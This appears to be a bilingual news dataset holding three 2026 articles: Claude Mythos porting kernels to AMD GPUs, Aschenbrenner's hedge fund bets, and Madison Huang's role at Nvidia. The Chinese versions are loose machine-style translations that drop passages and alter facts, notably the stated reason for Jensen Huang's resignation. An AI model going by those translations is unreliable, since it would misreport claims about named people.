title: Anthropic says Claude Mythos slashed software work to onboard AMD GPUs from up to 12 months to around three days —writing almost 100% of kernels autonomously chips away at Nvidia's CUDA moat
title_en: Anthropic says Claude Mythos slashed software work to onboard AMD GPUs from up to 12 months to around three days —writing almost 100% of kernels autonomously chips away at Nvidia's CUDA moat

inline_images.caption: (Image credit: Anthropic)
inline_images.caption_en: (Image credit: Anthropic)

author: Shane Downing
article_content:
Anthropic told IPO investors that its Claude Mythos Preview model did the software work required to get its AI running on AMD’s GPUs in about three days, with “basically no human intervention,” a job it says used to take six to 12 months. The three days cover prompt processing for one Anthropic model on AMD MI355X GPUs “at a useful level of performance,” with Mythos porting or writing “almost 100% of the kernels.” That kind of low-level code, which ties an AI model to one company’s chips, has long been part of Nvidia’s CUDA moat, and an AI that can write it in days would suggest that moat is eroding.

Tom Brown, Anthropic’s co-founder and chief compute officer, made the time comparison, noting to investors that the original meant using a team of “dozens of engineers.” The company already runs its models on multiple kinds of chips — on GPUs from Nvidia and AMD, Google’s TPUs, and AWS Trainium — and its fleet is managed as “one fungible pool of compute.” Brown called the early multi-chip decision “an unconventional bet.” It may have been a wise one, given that Google’s TPUs can now natively run AI models built in PyTorch, and Meta uses them in production.

Anthropic's claim that the job used to take six to 12 months comes from past work, from its “historical experience bringing up new accelerators using traditional engineering approaches,” where tailoring the code to each hardware platform was a challenge. Removing that onboarding barrier could reduce things to a purchase decision, and Anthropic started working with AMD GPUs for the first time this year, with an agreement for up to 2 gigawatts now in place.

CUDA, Nvidia’s programming platform, is very mature at nearly two decades old. AMD has an equivalent, ROCm, with HIP as its programming layer. Code written for CUDA has to be transformed to work there, and AMD even built a tool called HIPify for the process. There is still a conversion cost to switching, and AMD’s vice president of AI software, Anush Elangovan, told EE Times in April that “Claude is better than HIPify because it has web search built in.”

AMD has been making the argument that AI can write this type of code since August of last year, presenting a research agent that fell short of human experts at the time. In September of that year, AMD CEO Lisa Su said on the Possible podcast that much of AI software is written in CUDA, which needs to be “translated to AMD,” and “a ton of that can now be done in software.”

Moving forward to July earlier this year, AMD’s senior vice president of AI, Vamsi Boppana, said its engineers were using AI models to generate GPU kernels, and Su said that when she asked whether her team was helping the Anthropic engineer working on the MI355X, she was told they didn’t need any help. Boppana said that in some cases, the resulting kernels were even “better than the most manually tuned versions.” Under its July agreement with Anthropic, AMD is also using Claude to optimize workloads for its Instinct GPUs and to speed up ROCm development.

At AMD’s Advancing AI event in July, OpenAI’s Philippe Tillet said that once OpenAI got its Helios racks, a single engineer confirmed everything worked within a few days, and that “agents are taking over our jobs, in a sense, as kernel engineers.” Before the event, AMD’s Andrew Dieckman, corporate vice president and general manager of the company’s data center GPU business, told reporters that he has had practically zero conversations with AMD’s customers about CUDA.

• Date: Aug. 1, 2025 | Who: AMD researchers | What they said or showed: Published GEAK, an AI agent that writes GPU kernels; against 30 expert-written kernels it got 19 right, at 0.92 times the experts’ speed on average | Where: AMD’s ROCm blog

• Date: Sept. 24, 2025 | Who: Lisa Su, AMD chair and CEO | What they said or showed: Asked about AI coding tools, said much of the code written for CUDA can now be translated to AMD in software: “We’re using software to significantly optimize our customers’ code so that they can run on AMD” | Where: Possible podcast

• Date: April 1, 2026 | Who: Anush Elangovan, AMD vice president of AI software | What they said or showed: Compared Claude with HIPify, AMD’s tool for converting CUDA code: “Claude is better than HIPify because it has web search built in” | Where: EE Times interview

• Date: April 15, 2026 | Who: Jensen Huang, Nvidia CEO | What they said or showed: “We use a ton of AI to create the kernels that we have”; “nobody knows our architecture better than we do” | Where: Dwarkesh Patel interview

• Date: July 23, 2026 | Who: Andrew Dieckman, AMD corporate vice president and general manager, data center GPU business | What they said or showed: “I have almost zero conversations with our customers about CUDA at this point in time” | Where: PC Gamer, from a pre-event AMD briefing

• Date: July 23, 2026 | Who: Vamsi Boppana, AMD senior vice president of AI | What they said or showed: AI-assisted GPU programming will “remove any remaining barriers to broad adoption” | Where: AMD Advancing AI keynote

• Date: July 23, 2026 | Who: Philippe Tillet, OpenAI | What they said or showed: “agents are taking over our jobs, in a sense, as kernel engineers” | Where: AMD Advancing AI keynote

• Date: July 23, 2026 | Who: Tom Brown, Anthropic co-founder and chief compute officer | What they said or showed: One engineer asked Claude to bring up an MI355X rack and left it running “over the weekend” | Where: AMD Advancing AI keynote

• Date: Nov. 10, 2026 | Who: Tom Brown, Anthropic co-founder and chief compute officer | What they said or showed: Mythos “got Claude running on AMD in just three days with basically no human intervention”; the slide footnote limits the three days to prompt processing for one model | Where: Anthropic’s IPO roadshow video

Until this week, though, all of this came from AMD or its stage, not from Anthropic to its own investors. Anthropic buys the chips rather than selling them, and it’s heading into its IPO next week, so its multi-chip approach — now with at least some numbers to back it up — carries more weight than a chipmaker’s claims. Its prospectus says it in writing, too, though without a number: “We can onboard new chip platforms in a fraction of the time it once took.”

• Where Anthropic said it: AMD’s Advancing AI keynote, July 23 | Who did the work: One engineer and Claude | How long: Not stated; left running “over the weekend” | What it covered: Its “leading model” on an MI355X rack, with performance climbing | What it replaced: What it called “a big effort”

• Where Anthropic said it: IPO roadshow video, narration, Nov. 10 | Who did the work: Mythos, with “basically no human intervention” | How long: Three days (“in just three days”) | What it covered: Getting “Claude running on AMD”; Claude “ported or wrote almost 100% of the kernels” | What it replaced: Work that “took dozens of engineers months”

• Where Anthropic said it: IPO roadshow video, slide footnote, Nov. 10 | Who did the work: Claude Mythos Preview | How long: About three days (“~3 day timeline”) | What it covered: Bringing up “prompt processing for one Anthropic model on AMD MI355X GPUs at a useful level of performance” | What it replaced: Six to 12 months (“~6-12-month estimate”), from “historical experience bringing up new accelerators”

• Where Anthropic said it: Prospectus (S-1/A No. 2), Nov. 10 | Who did the work: Its engineering teams, “leveraging Claude” | How long: No figure; “more quickly” | What it covered: Bringing “new chip platforms into production”; no chip named | What it replaced: What it calls “intense engineering effort over many months”

The prompt processing (prefill) part of the workload is the step where a model reads and processes what it’s been given before it starts replying, and Anthropic hasn’t said whether the replying step (decode) was included as well. Anthropic’s chart, with its axis labeled “Time to onboard new silicon,” shows both lines reaching the same “~100%” mark without saying 100% of what. The company also hasn’t said how fast the model ran on AMD’s GPUs versus Nvidia’s, and that’s the comparison we want to see to show whether AMD’s chips, running AI-written code, can match Nvidia silicon.

On the other hand, Nvidia CEO Jensen Huang said in an April interview with Dwarkesh Patel that Nvidia already uses AI on its own kernels and knows its chips best — “nobody knows our architecture better than we do” — and can get the most out of them. Asked why labs like Anthropic use other accelerators, he called Anthropic “a unique instance, not a trend.” Nvidia and AMD, among seven companies, are buying $26.0 billion of Anthropic’s stock at the IPO price, so Nvidia is investing in the very company Huang called the exception.

In late July, SemiAnalysis published an article, “Can AMD break the CUDA Moat?,” which essentially said that software creation is not the same moat it was even a year ago. That said, the catch for AMD is that with agentic coding, “each agent requires GPUs to test their code against,” which means that the AI writing the code still needs the hardware. It has found a constant lack of GPUs inside AMD for this type of development, which has held AMD back and may be a new bottleneck.

That leaves CUDA’s moat somewhere in between. Getting a model running on a new chip, once the expensive part, appears to be getting cheaper, and better AI may wear down Nvidia’s claim that it knows its hardware best. As for Anthropic’s fungible pool, the chips in it aren’t fully interchangeable — Google’s TPUs are increasingly specialized, for example — and getting the most out of any of them still takes the hardware to test on. The moat is narrowing, but is not gone.

Anthropic’s first AMD MI450 chips, in Helios racks, are expected in the first half of 2027. That’s a new generation and an opportunity to see if the three-day bring-up can be repeated. Anthropic’s IPO comes sooner, after which it will report as a public company.

article_content_zh:
Anthropic 告诉 IPO 投资者，其 Claude Mythos Preview 模型在大约三天内完成了使其人工智能在 AMD GPU 上运行所需的软件工作，“基本上没有人工干预”，据称这项工作过去需要 6 到 12 个月的时间。这三天的内容是在 AMD MI355X GPU 上“以有用的性能水平”快速处理一个 Anthropic 模型，并通过 Mythos 移植或编写“几乎 100% 的内核”。这种将人工智能模型与一家公司的芯片联系起来的低级代码长期以来一直是 Nvidia CUDA 护城河的一部分，而能够在几天内编写出来的人工智能则表明护城河正在被侵蚀。

Anthropic 的联合创始人兼首席计算官汤姆·布朗 (Tom Brown) 进行了时间比较，他向投资者指出，最初意味着使用一个由“数十名工程师”组成的团队。该公司已经在多种芯片上运行其模型——Nvidia 和 AMD 的 GPU、谷歌的 TPU 和 AWS Trainium——并且其机群作为“一个可替代的计算池”进行管理。布朗称早期的多芯片决策是“一次非常规的赌注”。这可能是明智之举，因为谷歌的 TPU 现在可以本地运行 PyTorch 中构建的 AI 模型，并且 Meta 在生产中使用它们。

Anthropic 声称，这项工作过去需要 6 到 12 个月的时间，这来自过去的工作，来自其“使用传统工程方法开发新加速器的历史经验”，其中为每个硬件平台定制代码是一项挑战。消除这一入门障碍可能会减少购买决策的难度，Anthropic 今年首次开始与 AMD GPU 合作，目前已达成高达 2 吉瓦的协议。

CUDA 是 Nvidia 的编程平台，已有近二十年的历史，非常成熟。 AMD 有一个等效的 ROCm，以 HIP 作为其编程层。为 CUDA 编写的代码必须进行转换才能在那里工作，AMD 甚至为此过程构建了一个名为 HIPify 的工具。转换仍然存在转换成本，AMD 人工智能软件副总裁 Anush Elangovan 在 4 月份告诉《EE Times》，“Claude 比 HIPify 更好，因为它内置了网络搜索。”

自去年 8 月以来，AMD 一直在论证人工智能可以编写此类代码，并推出了当时达不到人类专家水平的研究代理。同年 9 月，AMD 首席执行官苏姿丰 (Lisa Su) 在Possible 播客上表示，大部分人工智能软件都是用 CUDA 编写的，需要“翻译成 AMD”，并且“现在很多工作都可以用软件来完成”。

今年 7 月初，AMD 人工智能高级副总裁 Vamsi Boppana 表示，其工程师正在使用人工智能模型生成 GPU 内核，Su 表示，当她询问她的团队是否正在帮助 Anthropic 工程师开发 MI355X 时，她被告知他们不需要任何帮助。 Boppana 表示，在某些情况下，生成的内核甚至“比大多数手动调整的版本更好”。根据 7 月份与 Anthropic 达成的协议，AMD 还使用 Claude 来优化其 Instinct GPU 的工作负载并加速 ROCm 开发。

在 7 月份的 AMD 高级人工智能活动中，OpenAI 的 Philippe Tillet 表示，一旦 OpenAI 拿到了 Helios 机架，一名工程师就在几天内确认一切正常，并且“从某种意义上说，代理正在接管我们的工作，就像内核工程师一样。”活动之前，AMD 公司副总裁兼公司数据中心 GPU 业务总经理 Andrew Dieckman 告诉记者，他与 AMD 客户关于 CUDA 的对话几乎为零。

• 日期：2025 年 9 月 24 日 |人物：AMD 董事长兼首席执行官 Lisa Su |他们所说或展示的内容：当被问及 AI 编码工具时，表示为 CUDA 编写的大部分代码现在可以在软件中转换为 AMD：“我们正在使用软件来显着优化客户的代码，以便他们可以在 AMD 上运行”|地点：可能的播客

• 日期：2026 年 4 月 1 日 |人物：Anush Elangovan，AMD 人工智能软件副总裁 |他们所说或展示的内容：将 Claude 与 AMD 用于转换 CUDA 代码的工具 HIPify 进行比较：“Claude 比 HIPify 更好，因为它内置了网络搜索”|地点：EE Times 采访

• 日期：2026 年 7 月 23 日 |人物：Andrew Dieckman，AMD 公司副总裁兼数据中心 GPU 业务总经理 |他们所说或展示的内容：“目前我与客户关于 CUDA 的对话几乎为零” |地点：PC Gamer，来自 AMD 活动前的简报

• 日期：2026 年 7 月 23 日 |人物：Vamsi Boppana，AMD 人工智能高级副总裁 |他们所说或展示的内容：人工智能辅助 GPU 编程将“消除广泛采用的任何剩余障碍”|地点：AMD 推进人工智能主题演讲

• 日期：2026 年 7 月 23 日 |人物：Philippe Tillet，OpenAI |他们所说或表明的内容：“从某种意义上说，代理人正在接管我们的工作，就像核心工程师一样” |地点：AMD 推进人工智能主题演讲

• 日期：2026 年 7 月 23 日 |人物：Tom Brown，Anthropic 联合创始人兼首席计算官 |他们所说或展示的内容：一位工程师要求 Claude 拿出一个 MI355X 机架，并让它“整个周末”运行 |地点：AMD 推进人工智能主题演讲

• 日期：2026 年 11 月 10 日 |人物：Tom Brown，Anthropic 联合创始人兼首席计算官 |他们所说或展示的内容：Mythos“让 Claude 在短短三天内在 AMD 上运行，基本上没有人为干预”；幻灯片脚注限制了一个模型的三天提示处理时间|地点：Anthropic 的 IPO 路演视频

不过，直到本周，所有这些都来自 AMD 或其舞台，而不是来自 Anthropic 自己的投资者。 Anthropic 购买芯片而不是出售它们，而且该公司将于下周进行 IPO，因此其多芯片方法（现在至少有一些数据支持）比芯片制造商的声明更有分量。它的招股说明书也以书面形式表示，尽管没有具体数字：“我们可以用以前所用时间的一小部分来安装新的芯片平台。”

• Anthropic 所说的：AMD 的推进人工智能主题演讲，7 月 23 日 |谁完成了这项工作：一名工程师和克劳德 |多长时间：未说明； “周末”继续跑步 |涵盖内容：MI355X 机架上的“领先型号”，性能不断攀升 |它取代了什么：所谓的“巨大努力”

• Anthropic 所说的：IPO 路演视频，旁白，11 月 10 日 |谁做的工作：神话，“基本上没有人为干预” |多长时间：三天（“只需三天”）|内容：让“Claude 在 AMD 上运行”； Claude“移植或编写了几乎 100% 的内核”|它取代了什么：“花费了数十名工程师几个月”的工作

• Anthropic 所说的地方：IPO 路演视频，幻灯片脚注，11 月 10 日 |谁完成了这项工作：克劳德神话预览|时长：大约三天（“~3 天的时间表”）|内容：“在 AMD MI355X GPU 上以有用的性能水平快速处理一个 Anthropic 模型” |它所取代的内容：六到 12 个月（“~6-12 个月的估计”），来自“推出新加速器的历史经验”

• Anthropic 如此表述：招股说明书（S-1/A 第 2 号），11 月 10 日 |谁做了这项工作：它的工程团队，“利用克劳德” |多长时间：无数字； “更快”|内容：将“新芯片平台投入生产”；没有名为 | 的芯片它取代了什么：所谓的“数月的密集工程工作”

工作负载的提示处理（预填充）部分是模型在开始回复之前读取并处理所给内容的步骤，Anthropic 没有透露是否也包括回复步骤（解码）。 Anthropic 的图表的轴标记为“搭载新芯片的时间”，显示两条线都达到了相同的“~100%”标记，但没有说明 100% 是什么。该公司还没有透露该模型在 AMD 的 GPU 上与 Nvidia 的 GPU 上运行的速度有多快，这就是我们希望看到的比较，以显示运行人工智能编写的代码的 AMD 芯片是否可以与 Nvidia 的芯片相媲美。

另一方面，Nvidia 首席执行官黄仁勋在 4 月份接受 Dwarkesh Patel 采访时表示，Nvidia 已经在自己的内核上使用了人工智能，并且最了解自己的芯片——“没有人比我们更了解我们的架构”——并且可以充分利用它们。当被问及为什么像 Anthropic 这样的实验室使用其他加速器时，他称 Anthropic 是“一个独特的实例，而不是一种趋势”。 Nvidia 和 AMD 等七家公司正在以 IPO 价格购买 260 亿美元的 Anthropic 股票，因此 Nvidia 投资的正是黄黄所说的例外公司。

7 月下旬，SemiAnalysis 发表了一篇文章“AMD 能否打破 CUDA 护城河？”，该文章本质上是说，软件创建与一年前的护城河已经不一样了。也就是说，AMD 的问题在于，通过代理编码，“每个代理都需要 GPU 来测试其代码”，这意味着编写代码的人工智能仍然需要硬件。它发现AMD内部一直缺乏用于此类开发的GPU，这阻碍了AMD的发展，并可能成为新的瓶颈。

这使得 CUDA 的护城河介于两者之间。让模型在新芯片上运行，曾经是昂贵的部件，现在似乎变得越来越便宜，而更好的人工智能可能会削弱英伟达“最了解自己的硬件”的说法。至于 Anthropic 的可替代池，其中的芯片并不是完全可互换的——例如，谷歌的 TPU 越来越专业化——并且要充分利用其中任何一个仍然需要对硬件进行测试。护城河正在变窄，但并没有消失。

Anthropic 的首款 AMD MI450 芯片预计将于 2027 年上半年在 Helios 机架中上市。这是新一代芯片，也是一个看看是否可以重复为期三天的启动的机会。 Anthropic 的 IPO 会提前进行，之后它将作为一家上市公司进行报告。

title: Aschenbrenner’s Situational Awareness made AI bets again before October rout
title_en: Aschenbrenner’s Situational Awareness made AI bets again before October rout
author: Sean Conlon
article_content:
Leopold Aschenbrenner's artificial intelligence-themed hedge fund Situational Awareness, which nearly collapsed in July, loaded back up on AI stocks as it returned to the financial markets at the end of the third quarter. But all of its holdings are down big the last month and a half.

According to a new regulatory filing, as the fund got back on its feet Aschenbrenner took an equity position in Australian neocloud company SharonAI valued at more than $440 million, along with equity stakes in AI-centric plays Cleanspark, IREN, Bitdeer Technologies and Fermi. The Cleanspark stake is worth almost $39 million, while Iren and Bitdeer stakes are more than $21 million and more than $20 million, respectively. Fermi, meanwhile, has a value of more than $11 million.

The fund also owned call options at the end of September in neocloud Nebius, memory chip name Sandisk, the Roundhill Memory ETF (DRAM) and data center power play Bloom Energy. Sandisk and Nebius were key holdings that almost took out his fund over the summer.

All of these Situational Awareness holdings have been routed since Sept. 30. SharonAI is at the top of that list, seeing a 58% loss in October. It's also fallen 11% so far this month. IREN was down 41% in October, while Nebius declined 35%. Last week, Nebius plummeted more than 16% in a single day after the company issued a weak full-year forecast.

It's not known whether the hedge fund manager got out of those positions during the October AI selloff. The 13F filing is just a snapshot of what the hedge fund held at the end of the quarter.

Aschenbrenner — who launched the fund in 2024 after rising to fame that same year with his AI manifesto also entitled Situational Awareness — re-entered financial markets a bit in September, sources told CNBC at the time.

The Monday filing shows he picked up right where he left off.

The near-collapse of his hedge fund over the summer forced him to sell all of its public equity positions to Ken Griffin's Citadel. The fund had $45 billion in assets at its peak, but that tumbled to around $10 billion, consisting mostly of private stakes.

Stocked tethered to the AI trade took a hit in the most recent quarter as investors grew concerned about a slowdown in development of the technology. Those fears were spurred by comments from industry leaders such as Anthropic CEO Dario Amodei and OpenAI CEO Sam Altman back in September, with the latter saying that the company going public this year would be "ill-advised."

Since then, pressure on the trade has only continued.

In recent weeks, investors have worried about how Democratic wins in the midterm elections could hinder data center development, whether some technology companies are using too much debt to finance the AI buildout and what role Nvidia will play in that financing with Jensen Huang now out as CEO at the company.

Losses in Nvidia as well as other AI-related stocks dragged down the three leading U.S. indexes during Monday's session as investors continued to assess the fallout of Huang's departure.

article_content_zh:
Leopold Aschenbrenner 的人工智能主题对冲基金 Situational Awareness 在 7 月份几乎崩溃，但在第三季度末重返金融市场后，该基金重新买入了人工智能股票。但在过去的一个半月里，其持有的所有股票都大幅下跌。

根据一份新的监管文件，随着该基金重新站稳脚跟，Aschenbrenner 获得了价值超过 4.4 亿美元的澳大利亚新云公司 SharonAI 的股权，以及以人工智能为中心的公司 Cleanspark、IREN、Bitdeer Technologies 和 Fermi 的股权。 Cleanspark 的股份价值近 3900 万美元，而 Iren 和 Bitdeer 的股份分别超过 2100 万美元和 2000 万美元。与此同时，费米的价值超过 1100 万美元。

9月底，该基金还拥有neocloud Nebius、存储芯片品牌Sandisk、Roundhill Memory ETF (DRAM)和数据中心电力公司Bloom Energy的看涨期权。 Sandisk 和 Nebius 是他的重点持股，整个夏天几乎耗尽了他的资金。

自 9 月 30 日以来，所有这些 Situational Awareness 资产都已被淘汰。SharonAI 位居榜首，10 月份下跌了 58%。本月到目前为止，该指数也下跌了 11%。 IREN 10 月份下跌 41%，Nebius 下跌 35%。上周，在该公司发布疲弱的全年预测后，Nebius 单日暴跌超过 16%。

目前尚不清楚这位对冲基金经理是否在 10 月份人工智能抛售期间平仓。 13F 的文件只是该对冲基金本季度末持有资产的一个快照。

据消息人士当时向 CNBC 透露，阿申布伦纳 (Aschenbrenner) 于 2024 年推出了该基金，同年凭借其题为“态势感知”的人工智能宣言而声名鹊起，并于 9 月重新进入金融市场。

周一的文件显示，他从上次停下的地方继续了下去。

今年夏天，他的对冲基金几近崩溃，迫使他将所有公开股票头寸出售给肯·格里芬 (Ken Griffin) 的 Citadel。该基金在巅峰时期拥有 450 亿美元的资产，但后来跌至 100 亿美元左右，其中大部分是私人股权。

由于投资者越来越担心该技术的发展放缓，与人工智能交易相关的股票在最近一个季度受到了打击。 Anthropic 首席执行官达里奥·阿莫迪 (Dario Amodei) 和 OpenAI 首席执行官萨姆·奥尔特曼 (Sam Altman) 等行业领袖在 9 月份的评论引发了这些担忧，后者表示该公司今年上市将是“不明智的”。

此后，贸易面临的压力持续存在。

最近几周，投资者担心民主党在中期选举中获胜可能会阻碍数据中心的发展，一些科技公司是否使用过多的债务来为人工智能建设提供资金，以及英伟达将在这笔融资中扮演什么角色，黄仁勋现已卸任该公司首席执行官。

由于投资者继续评估黄仁勋离职的影响，英伟达以及其他人工智能相关股票的下跌拖累了周一盘中美国三大股指的下跌。

title: Jensen Huang’s Daughter, a Close Ally, Remains in Senior Role at Nvidia
title_en: Jensen Huang’s Daughter, a Close Ally, Remains in Senior Role at Nvidia

inline_images.caption: Spencer Huang, Jensen Huang’s son and a director of product management for robotics at Nvidia. (Chiangying-Ying/Associated Press)
inline_images.alt: Spencer Huang, Jensen Huang’s son and a director of product management for robotics at Nvidia.

inline_images.caption: Ms. Huang with her husband, Nico Caprez, the vice president of global A.I. infrastructure growth at Nvidia. (Jacquelyn Martin/Associated Press)
inline_images.alt: Ms. Huang with her husband, Nico Caprez, the vice president of global A.I. infrastructure growth at Nvidia.

inline_images.caption: Toy Jensen, as a cartoon version of Jensen Huang is known at Nvidia, in holograph form at the company’s developer conference in March. (Manuel Orbegozo for The New York Times)
inline_images.alt: Toy Jensen, as a cartoon version of Jensen Huang is known at Nvidia, in holograph form at the company’s developer conference in March.

inline_images.caption: The Huang family, Madison, Lori, Jensen, and Spencer, at a gala in California in 2007. (MediaNews Group/The Mercury News, via Getty Images)
inline_images.alt: The Huang family, Madison, Lori, Jensen, and Spencer, at a gala in California in 2007.

author: Kalley Huang, Tripp Mickle, and Ryan Mac
article_content:
Madison Huang was yelling. Her father, Nvidia’s chief executive, Jensen Huang, had been scheduled to headline a conference in New Delhi in February. Shortly before the event, Mr. Huang pulled out and tapped a longtime lieutenant, Jay Puri, to attend in his place.

But Nvidia hadn’t buttoned up its plans for the conference, infuriating Ms. Huang. On a call ahead of the event, Ms. Huang berated other employees — including Mr. Puri — for being unprepared, said three people familiar with the meeting. Eventually, Mr. Puri interrupted and told Ms. Huang he could answer her questions if she stopped yelling at him.

Less than six months later, Mr. Puri left his role at Nvidia.

The tense meeting highlighted the powerful and sometimes disruptive role Ms. Huang, 35, played at the company her father co-founded, according to more than a dozen current and former employees who spoke on condition of anonymity about the family’s leadership of Nvidia. Before Mr. Huang resigned last week, she had become his de facto chief of staff, with considerable authority over more seasoned executives.

That influence creates an immediate challenge for Colette Kress, Nvidia’s interim chief executive, who replaced Mr. Huang after his resignation last week. Ms. Kress must quickly determine how much power Ms. Huang will have in the company after her father’s exit. She must also decide what to do about Mr. Huang’s other family members employed at the company: his son, Spencer Huang, and his son-in-law, Nico Caprez.

Mr. Huang resigned after revelations that he had had extramarital relationships with an Nvidia executive and a customer that U.S. intelligence concluded was working for Chinese intelligence.

The continued presence of Ms. Huang has raised concerns among senior executives that she has conflicted loyalties between the company and her father. Those concerns were heightened over the last few days as Mr. Huang’s allies in Silicon Valley and on Wall Street started a campaign to reinstate him, and President Trump said he “would not mind” if Mr. Huang returned to his job.

The Huang family, including Jensen, Madison and Spencer, and Mr. Puri did not respond to requests for comment.

Mr. Huang, who employees say also has a hot temper, was aware of his daughter’s behavior. He occasionally threatened to sic an angry Ms. Huang on other employees and told them to be afraid of her, said two people familiar with the comments. And even senior executives thought they could not disagree with Ms. Huang because of her direct line to the boss.

“Nepotism is almost always a bad idea,” said David Yoffie, a Harvard Business School professor who has served on more than a dozen corporate boards. “There are few examples of it even working modestly well.”

Mr. Huang has said he wasn’t around much as a father. On a podcast recorded in April, he said he “missed a lot” of Madison and Spencer’s childhoods, including “all of their karate tournaments.” Mr. Huang’s wife, Lori, an accomplished electrical engineer, left her job to raise their children shortly before he co-founded Nvidia in 1993.

His children learned from an early age to care about Nvidia.

“Both kids have read every shareholder letter, gone to every shareholder meeting, been to every single conference that I’ve ever done,” Mr. Huang said on the podcast. “Despite the fact that I was gone a lot, they found a way to always love the company.”

Mr. Huang’s children took winding paths to Nvidia. Madison received her bachelor’s degree from the Culinary Institute of America in 2012, and studied baking and wine at Le Cordon Bleu in Paris and London from 2013 to 2015, according to her profile on LinkedIn. She then managed luxury hotels and an Italian pastry shop owned by Louis Vuitton Moët Hennessey for four years. In 2019, she started at London Business School and then joined the family business in 2020.

Spencer, 36, received his bachelor’s degree from Columbia College Chicago, an arts school, in 2013, according to his profile on LinkedIn. He then owned a bar in Taipei called R&D Cocktail Lab for eight years. In 2022, he joined Nvidia, where he is now a director of product management for its robotics efforts. He is considered to be quiet and focused on his responsibilities, said seven people familiar with his work.

Mr. Caprez, who met Ms. Huang at London Business School, joined Nvidia in 2024 and became heavily involved in deal making. He has had a meteoric rise through the company, where he is now a vice president of A.I. infrastructure growth and had attended executive team meetings with Mr. Huang.

The trio has been viewed as an extension of Mr. Huang, but Ms. Huang has had the most influence.

Ms. Huang, whom colleagues called smart and a gifted marketer, is officially a senior director of product marketing for physical A.I. She has been known for having sharp insights, getting work done and being a polished representative of the company in public settings.

But in practice, she has acted as a chief of staff for her father and had significant sway over Nvidia’s marketing and communications. She also joined his quarterly meetings with his executive team, regularly presented to the company’s board, and helped build her father’s celebrity image.

About six years ago, Nvidia started marketing itself with a cartoon version of Mr. Huang, internally called “Toy Jensen.” After Ms. Huang joined the company in 2020, she pushed its marketing team to use that image of her father more widely, said two people familiar with the discussions. Nvidia started making pins with Toy Jensen and welcoming new hires with a video of the cartoon. But Toy Jensen unnerved some employees, who worried it made Nvidia seem like a cult.

In March, at its developer conference, Nvidia sold a $178 sweater with Toy Jensen on it. Mr. Huang ended his keynote speech at the conference with a nearly four-minute-long video of his cartoon self singing at a campfire with robots.

Nvidia stopped marketing itself with the cartoon Mr. Huang after he admitted last week that he had been unfaithful to his wife.

In May 2025, Ms. Huang played a central role in hiring a crisis communications firm called Heller to help manage her family’s public image. She has told Nvidia’s communications team it wasn’t doing enough to protect Mr. Huang’s reputation and pushed the team to involve Heller in responses to matters related to her father, said five people familiar with the strategy.

In October 2025, when The New York Times reported on Nvidia’s business with Megaspeed and Mr. Huang’s close relationship with Alice Huang, an executive at the company, Mr. Huang’s daughter pressed Nvidia’s communications team to push back forcefully, while incorporating Heller for support. (The Times later reported that U.S. intelligence had determined Alice Huang was a Chinese intelligence asset, passing information to Beijing. China denies the claim, and Ms. Huang has not returned requests for comment.)

Madison Huang aggressively promoted and protected her father. And like her father, Ms. Huang was known for her temper. So many employees have complained about Ms. Huang that Nvidia’s human resources department for several months made her start weekly coaching sessions about her management style, said three people familiar with the response.

Over the years, Ms. Huang has also clashed with Ms. Kress, the company’s chief financial officer who is now also the interim chief executive, particularly over investments she was pursuing in robotics companies and deals Mr. Caprez wanted to strike with data center businesses, said four people familiar with the relationships.

As her power inside Nvidia has grown over the past three years, Nvidia employees estimate that more than a dozen key executives have left the company because they disliked working with her.

In meetings with other employees, Ms. Huang has yelled at her brother and executives who, on paper, managed her or were above her organizationally. Late last year, as Ms. Huang yelled at others on Nvidia’s marketing team, a vice president had a panic attack and had to leave the call with her, said two people familiar with the meeting.

In March, ahead of Nvidia’s developer conference, Ms. Huang ripped into Ian Buck, a vice president at the company and the inventor of Cuda, a software that allows Nvidia’s chips to be used to train A.I.

Mr. Buck hadn’t prepared a presentation for a briefing with reporters and had planned to improvise, a person familiar with the meeting said. Ms. Huang yelled at him in front of Nvidia’s communications team, and Mr. Buck later became upset with his own communications team. (Mr. Buck is now considered by some to be a front-runner to permanently succeed Mr. Huang.)

Mr. Buck did not respond to requests for comment.

To other employees, the exchange was confirmation of what they already knew: Ms. Huang was her father’s daughter.

title_zh: 黄仁勋的女儿是亲密盟友，仍担任 Nvidia 的高级职位
summary_zh: 英伟达CEO黄仁勋因关联中国情报风险及婚外情辞职，其女Madison Huang在公司内部的过度权威引发高层动荡与继任困局
article_content_zh:
Madison Huang在喊叫。她的父亲、英伟达首席执行官黄仁勋原定于2月在新德里出席一场会议并发表主旨演讲。就在活动前不久，黄先生退出，并指派其多年的得力助手杰伊·普里（Jay Puri）代为出席。

但英伟达没有把这次会议的计划安排妥当，这让黄女士大为恼火。三名知情人士透露，在活动前的一次电话会议上，黄女士斥责其他员工（包括普里先生）准备不充分。

这种影响力给Nvidia的临时首席执行官Colette Kress带来了直接的挑战，她在黄先生上周辞职后接替了他的职位。Kress女士必须迅速确定黄女士在她父亲离职后将在公司拥有多大权力。她还必须决定如何处理黄先生在公司任职的其他家庭成员：他的儿子Spencer Huang和他的女婿Nico Caprez。

在黄先生被曝出曾与多名女性有婚外关系后，他随即辞职。

员工称黄先生脾气暴躁，他知道女儿的行为。两位知情人士称，他偶尔会威胁其他员工，让愤怒的黄女士害怕她。就连高级管理人员也认为他们不能不同意黄女士的观点，因为她与老板有直接关系。

“裙带关系几乎总是一个坏主意，”曾在十几家公司董事会任职的哈佛商学院教授戴维·约菲 (David Yoffie) 说。 “即使效果还算不错，也很少有例子。”

黄先生曾表示，他作为一名父亲并不在身边。在四月份录制的播客中，他说他“怀念很多”麦迪逊和斯宾塞的童年，包括“他们所有的空手道比赛”。黄先生的妻子 Lori 是一位出色的电气工程师，在 1993 年黄先生与他人共同创立 Nvidia 之前不久，她辞去了工作来抚养孩子。

他的孩子们从小就学会关心英伟达。

“两个孩子都读过每一封股东信，参加过每一次股东大会，参加过我参加过的每一次会议，”黄先生在播客上说。 “尽管我经常离开，但他们找到了一种方式来永远热爱这家公司。”

黄先生的孩子们蜿蜒来到了英伟达。根据她在 LinkedIn 上的个人资料，麦迪逊于 2012 年获得美国烹饪学院学士学位，并于 2013 年至 2015 年在巴黎和伦敦的蓝带国际学院学习烘焙和葡萄酒。随后，她管理了路易威登酩悦轩尼诗旗下的豪华酒店和一家意大利糕点店四年。 2019 年，她开始在伦敦商学院就读，并于 2020 年加入家族企业。

根据 LinkedIn 上的个人资料，36 岁的斯宾塞于 2013 年从艺术学校芝加哥哥伦比亚学院获得学士学位。随后，他在台北拥有一家名为 R&D Cocktail Lab 的酒吧八年。 2022 年，他加入 Nvidia，现任机器人技术产品管理总监。七位熟悉他工作的人士表示，他被认为很安静，专注于自己的职责。

